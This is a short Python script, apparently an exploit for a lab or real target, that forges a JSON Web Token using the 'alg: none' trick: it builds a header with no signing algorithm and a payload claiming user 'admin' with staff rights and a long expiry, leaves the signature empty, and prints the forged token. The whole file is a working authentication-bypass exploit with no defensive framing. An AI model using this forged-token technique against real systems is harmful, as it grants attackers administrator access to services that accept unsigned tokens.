import base64
import json


def b64url(data: bytes) -> str:
    # JWT uses base64url WITHOUT padding
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "is_staff": True, "exp": 1795078641}

# json.dumps with no spaces, matching the real token's compact encoding
header_json = json.dumps(header, separators=(",", ":")).encode()
payload_json = json.dumps(payload, separators=(",", ":")).encode()

header_b64 = b64url(header_json)
payload_b64 = b64url(payload_json)

# alg:none means the signature is empty, but the trailing dot must still be there
forged_token = f"{header_b64}.{payload_b64}."

print("Header JSON :", header_json.decode())
print("Payload JSON:", payload_json.decode())
print()
print("Forged token:")
print(forged_token)
